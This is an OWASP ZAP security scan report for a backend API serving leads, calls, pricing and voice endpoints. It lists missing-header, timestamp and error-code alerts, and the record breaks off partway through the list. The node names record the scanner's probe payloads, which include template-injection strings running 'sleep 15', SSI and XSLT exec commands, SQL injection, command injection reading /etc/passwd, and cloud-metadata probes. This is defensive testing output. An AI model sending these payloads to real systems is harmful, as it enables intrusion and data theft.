# ZAP Scanning Report

ZAP by [Checkmarx](https://checkmarx.com/).


## Summary of Alerts

| Risk Level | Number of Alerts |
| --- | --- |
| High | 0 |
| Medium | 0 |
| Low | 4 |
| Informational | 3 |




## Insights

| Level | Reason | Site | Description | Statistic |
| --- | --- | --- | --- | --- |
| Medium | Exceeded High | http://backend:8000 | Percentage of responses with status code 4xx | 84 % |
| Low | Warning |  | ZAP warnings logged - see the zap.log file for details | 30    |
| Info | Informational | http://backend:8000 | Percentage of responses with status code 2xx | 13 % |
| Info | Informational | http://backend:8000 | Percentage of responses with status code 3xx | 1 % |
| Info | Informational | http://backend:8000 | Percentage of responses with status code 5xx | 1 % |
| Info | Informational | http://backend:8000 | Percentage of endpoints with content type application/json | 99 % |
| Info | Informational | http://backend:8000 | Percentage of endpoints with content type text/plain | 1 % |
| Info | Informational | http://backend:8000 | Percentage of endpoints with method DELETE | 1 % |
| Info | Informational | http://backend:8000 | Percentage of endpoints with method GET | 14 % |
| Info | Informational | http://backend:8000 | Percentage of endpoints with method PATCH | 2 % |
| Info | Informational | http://backend:8000 | Percentage of endpoints with method POST | 43 % |
| Info | Informational | http://backend:8000 | Percentage of endpoints with method PUT | 39 % |
| Info | Informational | http://backend:8000 | Count of total endpoints | 299    |
| Info | Exceeded Low | http://backend:8000 | Percentage of slow responses | 5 % |







## Alerts

| Name | Risk Level | Number of Instances |
| --- | --- | --- |
| A Server Error response code was returned by the server | Low | 5 |
| Cross-Origin-Resource-Policy Header Missing or Invalid | Low | Systemic |
| Timestamp Disclosure - Unix | Low | 2 |
| X-Content-Type-Options Header Missing | Low | Systemic |
| A Client Error response code was returned by the server | Informational | 294 |
| Authentication Request Identified | Informational | 2 |
| Non-Storable Content | Informational | Systemic |




## Alert Detail



### [ A Server Error response code was returned by the server ](https://www.zaproxy.org/docs/alerts/100000/)



##### Low (High)

### Description

A response code of 503 was returned by the server.
This may indicate that the application is failing to handle unexpected input correctly.
Raised by the 'Alert on HTTP Response Code Error' script

* URL: http://backend:8000/leads/8661681940182828318
  * Node Name: `http://backend:8000/leads/8661681940182828318`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `500`
  * Other Info: ``
* URL: http://backend:8000/voice/token
  * Node Name: `http://backend:8000/voice/token`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `503`
  * Other Info: ``
* URL: http://backend:8000/voice/token/
  * Node Name: `http://backend:8000/voice/token/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `503`
  * Other Info: ``
* URL: http://backend:8000/leads/
  * Node Name: `http://backend:8000/leads/ ()({name,contact,call_sid,job_details:{John Doe},quote,status})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `500`
  * Other Info: ``
* URL: http://backend:8000/users/
  * Node Name: `http://backend:8000/users/ ()({username,password,role})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `500`
  * Other Info: ``


Instances: 5

### Solution



### Reference



#### CWE Id: [ 388 ](https://cwe.mitre.org/data/definitions/388.html)


#### WASC Id: 20

#### Source ID: 4

### [ Cross-Origin-Resource-Policy Header Missing or Invalid ](https://www.zaproxy.org/docs/alerts/90004/)



##### Low (Medium)

### Description

Cross-Origin-Resource-Policy header is an opt-in header designed to counter side-channels attacks like Spectre. Resource should be specifically set as shareable amongst different origins.

* URL: http://backend:8000/
  * Node Name: `http://backend:8000/`
  * Method: `GET`
  * Parameter: `Cross-Origin-Resource-Policy`
  * Attack: ``
  * Evidence: ``
  * Other Info: ``
* URL: http://backend:8000/calls/%3Fskip=0&limit=100
  * Node Name: `http://backend:8000/calls/ (limit,skip)`
  * Method: `GET`
  * Parameter: `Cross-Origin-Resource-Policy`
  * Attack: ``
  * Evidence: ``
  * Other Info: ``
* URL: http://backend:8000/health
  * Node Name: `http://backend:8000/health`
  * Method: `GET`
  * Parameter: `Cross-Origin-Resource-Policy`
  * Attack: ``
  * Evidence: ``
  * Other Info: ``
* URL: http://backend:8000/auth/logout
  * Node Name: `http://backend:8000/auth/logout`
  * Method: `POST`
  * Parameter: `Cross-Origin-Resource-Policy`
  * Attack: ``
  * Evidence: ``
  * Other Info: ``
* URL: http://backend:8000/calls/
  * Node Name: `http://backend:8000/calls/ ()({call_sid,duration,transcript,outcome})`
  * Method: `POST`
  * Parameter: `Cross-Origin-Resource-Policy`
  * Attack: ``
  * Evidence: ``
  * Other Info: ``

Instances: Systemic


### Solution

Ensure that the application/web server sets the Cross-Origin-Resource-Policy header appropriately, and that it sets the Cross-Origin-Resource-Policy header to 'same-origin' for all web pages.
'same-site' is considered as less secured and should be avoided.
If resources must be shared, set the header to 'cross-origin'.
If possible, ensure that the end user uses a standards-compliant and modern web browser that supports the Cross-Origin-Resource-Policy header (https://caniuse.com/mdn-http_headers_cross-origin-resource-policy).

### Reference


* [ https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Cross-Origin-Embedder-Policy ](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Cross-Origin-Embedder-Policy)


#### CWE Id: [ 693 ](https://cwe.mitre.org/data/definitions/693.html)


#### WASC Id: 14

#### Source ID: 3

### [ Timestamp Disclosure - Unix ](https://www.zaproxy.org/docs/alerts/10096/)



##### Low (Low)

### Description

A timestamp was disclosed by the application/web server. - Unix

* URL: http://backend:8000/users/
  * Node Name: `http://backend:8000/users/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `1793815166`
  * Other Info: `1793815166, which evaluates to: 2026-11-04 17:59:26.`
* URL: http://backend:8000/users/
  * Node Name: `http://backend:8000/users/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `1793815503`
  * Other Info: `1793815503, which evaluates to: 2026-11-04 18:05:03.`


Instances: 2

### Solution

Manually confirm that the timestamp data is not sensitive, and that the data cannot be aggregated to disclose exploitable patterns.

### Reference


* [ https://cwe.mitre.org/data/definitions/200.html ](https://cwe.mitre.org/data/definitions/200.html)


#### CWE Id: [ 497 ](https://cwe.mitre.org/data/definitions/497.html)


#### WASC Id: 13

#### Source ID: 3

### [ X-Content-Type-Options Header Missing ](https://www.zaproxy.org/docs/alerts/10021/)



##### Low (Medium)

### Description

The Anti-MIME-Sniffing header X-Content-Type-Options was not set to 'nosniff'. This allows older versions of Internet Explorer and Chrome to perform MIME-sniffing on the response body, potentially causing the response body to be interpreted and displayed as a content type other than the declared content type. Current (early 2014) and legacy versions of Firefox will use the declared content type (if one is set), rather than performing MIME-sniffing.

* URL: http://backend:8000/
  * Node Name: `http://backend:8000/`
  * Method: `GET`
  * Parameter: `x-content-type-options`
  * Attack: ``
  * Evidence: ``
  * Other Info: `This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
At "High" threshold this scan rule will not alert on client or server error responses.`
* URL: http://backend:8000/calls/%3Fskip=0&limit=100
  * Node Name: `http://backend:8000/calls/ (limit,skip)`
  * Method: `GET`
  * Parameter: `x-content-type-options`
  * Attack: ``
  * Evidence: ``
  * Other Info: `This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
At "High" threshold this scan rule will not alert on client or server error responses.`
* URL: http://backend:8000/health
  * Node Name: `http://backend:8000/health`
  * Method: `GET`
  * Parameter: `x-content-type-options`
  * Attack: ``
  * Evidence: ``
  * Other Info: `This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
At "High" threshold this scan rule will not alert on client or server error responses.`
* URL: http://backend:8000/calls/
  * Node Name: `http://backend:8000/calls/ ()({call_sid,duration,transcript,outcome})`
  * Method: `POST`
  * Parameter: `x-content-type-options`
  * Attack: ``
  * Evidence: ``
  * Other Info: `This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
At "High" threshold this scan rule will not alert on client or server error responses.`
* URL: http://backend:8000/leads/
  * Node Name: `http://backend:8000/leads/ ()({name,contact,call_sid,job_details:{John Doe},quote,status})`
  * Method: `POST`
  * Parameter: `x-content-type-options`
  * Attack: ``
  * Evidence: ``
  * Other Info: `This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.
At "High" threshold this scan rule will not alert on client or server error responses.`

Instances: Systemic


### Solution

Ensure that the application/web server sets the Content-Type header appropriately, and that it sets the X-Content-Type-Options header to 'nosniff' for all web pages.
If possible, ensure that the end user uses a standards-compliant and modern web browser that does not perform MIME-sniffing at all, or that can be directed by the web application/web server to not perform MIME-sniffing.

### Reference


* [ https://learn.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/compatibility/gg622941(v=vs.85) ](https://learn.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/compatibility/gg622941(v=vs.85))
* [ https://owasp.org/www-community/Security_Headers ](https://owasp.org/www-community/Security_Headers)


#### CWE Id: [ 693 ](https://cwe.mitre.org/data/definitions/693.html)


#### WASC Id: 15

#### Source ID: 3

### [ A Client Error response code was returned by the server ](https://www.zaproxy.org/docs/alerts/100000/)



##### Informational (High)

### Description

A response code of 404 was returned by the server.
This may indicate that the application is failing to handle unexpected input correctly.
Raised by the 'Alert on HTTP Response Code Error' script

* URL: http://backend:8000/leads/10
  * Node Name: `http://backend:8000/leads/10`
  * Method: `DELETE`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://backend:8000/6960579878873784377
  * Node Name: `http://backend:8000/6960579878873784377`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://backend:8000/audit-events/%3Factor_id=&start=&end=&event=&limit=100&offset=0
  * Node Name: `http://backend:8000/audit-events/ (actor_id,end,event,limit,offset,start)`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/audit-events/3636401594610912626
  * Node Name: `http://backend:8000/audit-events/3636401594610912626`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://backend:8000/auth
  * Node Name: `http://backend:8000/auth`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://backend:8000/auth/
  * Node Name: `http://backend:8000/auth/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://backend:8000/auth/310660848672172591
  * Node Name: `http://backend:8000/auth/310660848672172591`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://backend:8000/auth/me/4559246750591492686
  * Node Name: `http://backend:8000/auth/me/4559246750591492686`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://backend:8000/calls/%3Fskip=http%253A%252F%252Fwww.google.com%252F&limit=100
  * Node Name: `http://backend:8000/calls/ (limit,skip)`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/calls/8364290560199127234
  * Node Name: `http://backend:8000/calls/8364290560199127234`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://backend:8000/calls/call_sid
  * Node Name: `http://backend:8000/calls/call_sid`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://backend:8000/calls/call_sid/
  * Node Name: `http://backend:8000/calls/call_sid/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://backend:8000/computeMetadata/v1/
  * Node Name: `http://backend:8000/computeMetadata/v1/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://backend:8000/latest/meta-data/
  * Node Name: `http://backend:8000/latest/meta-data/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://backend:8000/leads/%3Fstatus=
  * Node Name: `http://backend:8000/leads/ (status)`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/leads/10
  * Node Name: `http://backend:8000/leads/10`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://backend:8000/leads/10/
  * Node Name: `http://backend:8000/leads/10/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://backend:8000/leads/10/5568823256868063601
  * Node Name: `http://backend:8000/leads/10/5568823256868063601`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://backend:8000/metadata/instance
  * Node Name: `http://backend:8000/metadata/instance`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://backend:8000/metadata/v1
  * Node Name: `http://backend:8000/metadata/v1`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://backend:8000/notifications/%3Fskip=http%253A%252F%252Fwww.google.com%252F&limit=100
  * Node Name: `http://backend:8000/notifications/ (limit,skip)`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/notifications/7419364858729039687
  * Node Name: `http://backend:8000/notifications/7419364858729039687`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://backend:8000/opc/v1/instance/
  * Node Name: `http://backend:8000/opc/v1/instance/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://backend:8000/opc/v2/instance/
  * Node Name: `http://backend:8000/opc/v2/instance/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://backend:8000/openstack/latest/meta_data.json
  * Node Name: `http://backend:8000/openstack/latest/meta_data.json`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://backend:8000/pricing
  * Node Name: `http://backend:8000/pricing`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://backend:8000/pricing/
  * Node Name: `http://backend:8000/pricing/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://backend:8000/pricing/2735445298549627225
  * Node Name: `http://backend:8000/pricing/2735445298549627225`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://backend:8000/users/2372429875545812573
  * Node Name: `http://backend:8000/users/2372429875545812573`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `405`
  * Other Info: ``
* URL: http://backend:8000/users/actuator/health
  * Node Name: `http://backend:8000/users/actuator/health`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://backend:8000/voice
  * Node Name: `http://backend:8000/voice`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://backend:8000/voice/
  * Node Name: `http://backend:8000/voice/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://backend:8000/voice/3274037630416968817
  * Node Name: `http://backend:8000/voice/3274037630416968817`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://backend:8000/auth/me
  * Node Name: `http://backend:8000/auth/me ()({"first_name":"John Doe","last_name":"John Doe","email":zaproxy@example.com})`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/auth/me/
  * Node Name: `http://backend:8000/auth/me/ ()({"first_name":"John Doe","last_name":"John Doe","email":zaproxy@example.com})`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/leads/10/status
  * Node Name: `http://backend:8000/leads/10/status`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/leads/10/status%3Fstatus=new
  * Node Name: `http://backend:8000/leads/10/status (status)`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://backend:8000/leads/10/status%3Fstatus=http%253A%252F%252Fwww.google.com%252F
  * Node Name: `http://backend:8000/leads/10/status (status)`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/leads/10/status/
  * Node Name: `http://backend:8000/leads/10/status/`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/users/10
  * Node Name: `http://backend:8000/users/10 ()({role,is_active})`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://backend:8000/users/10
  * Node Name: `http://backend:8000/users/10 ()({role,is_active})`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/users/10/
  * Node Name: `http://backend:8000/users/10/ ()({role,is_active})`
  * Method: `PATCH`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://backend:8000/auth/login
  * Node Name: `http://backend:8000/auth/login ()(client_id,client_secret,grant_type,password,scope,username)`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/auth/login/
  * Node Name: `http://backend:8000/auth/login/ ()(client_id,client_secret,grant_type,password,scope,username)`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/auth/me/password
  * Node Name: `http://backend:8000/auth/me/password ()({current_password,new_password})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `400`
  * Other Info: ``
* URL: http://backend:8000/auth/me/password
  * Node Name: `http://backend:8000/auth/me/password ()({current_password,new_password})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/auth/me/password/
  * Node Name: `http://backend:8000/auth/me/password/ ()({current_password,new_password})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `400`
  * Other Info: ``
* URL: http://backend:8000/auth/register
  * Node Name: `http://backend:8000/auth/register ()({username,password})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `400`
  * Other Info: ``
* URL: http://backend:8000/auth/register
  * Node Name: `http://backend:8000/auth/register ()({username,password})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/auth/register/
  * Node Name: `http://backend:8000/auth/register/ ()({username,password})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/calls/
  * Node Name: `http://backend:8000/calls/ ()({call_sid,duration,transcript,outcome})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `400`
  * Other Info: ``
* URL: http://backend:8000/calls/
  * Node Name: `http://backend:8000/calls/ ()({call_sid,duration,transcript,outcome})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/leads/
  * Node Name: `http://backend:8000/leads/ ()({name,contact,call_sid,job_details:{John Doe},quote,status})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/notifications/
  * Node Name: `http://backend:8000/notifications/ ()({"type":"sms","recipient":"John Doe","message":"Zaproxy alias impedit expedita quisquam pariatur exercitationem. Nemo rerum eveniet dolores rem quia dignissimos.","status":"sent","subject":Zaproxy dolore alias impedit expedita quisquam.,"provider_id":"John Doe"})`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("#set($engine=\"\")\n#set($proc=$engine.getClass().forName(\"java.lang.Runtime\").getRuntime().exec(\"sleep 15\"))\n#set($null=$proc.waitFor())\n${null}")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("#{%x(sleep 15)}")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("#{global.process.mainModule.require('child_process').execSync('sleep 15').toString()}")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("${@print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101).chr(110))}")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("${@print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101).chr(110))}\\")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("${__import__(\"subprocess\").check_output(\"sleep 15\", shell=True)}")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("'")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("'(")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("';print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101).chr(110));$var='")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("+response.write({0}*{1})+")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("1893954760473071002.owasp.org")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("5;URL='https://1893954760473071002.owasp.org'")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("5;URL='https://1893954760473071002.owasp.org/?John Doe'")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()(";")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()(";print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101).chr(110));")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("<!--")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("<!--#EXEC cmd=\"dir \\\"-->")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("<!--#EXEC cmd=\"ls /\"-->")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("<")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"sleep 15\") }")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("<%= global.process.mainModule.require('child_process').execSync('sleep 15').toString()%>")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("<%=%x(sleep 15)%>")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("<xsl:value-of select=\"document('http://backend:22')\"/>")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("<xsl:value-of select=\"php:function('exec','erroneous_command 2>&amp;1')\"/>")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("<xsl:value-of select=\"system-property('xsl:vendor')\"/>")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("<xsl:value-of select=\"system-property('xsl:vendor')\"/><!--")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("<xsl:variable name=\"rtobject\" select=\"runtime:getRuntime()\"/>\n<xsl:variable name=\"process\" select=\"runtime:exec($rtobject,'erroneous_command')\"/>\n<xsl:variable name=\"waiting\" select=\"process:waitFor($process)\"/>\n<xsl:value-of select=\"$process\"/>")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("John Doe AND 1=1 -- ")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("John Doe AND 1=2 -- ")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("John Doe OR 1=1 -- ")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("John Doe UNION ALL select NULL -- ")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("John Doe")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("John Doe&cat /etc/passwd&")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("John Doe&type %SYSTEMROOT%\\win.ini")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("John Doe' AND '1'='1' -- ")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("John Doe' AND '1'='2' -- ")`
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://backend:8000/pricing/calculate
  * Node Name: `http://backend:8000/pricing/calculate ()("John Doe' OR '1'='1' -- ")`
  * Method: `POST`
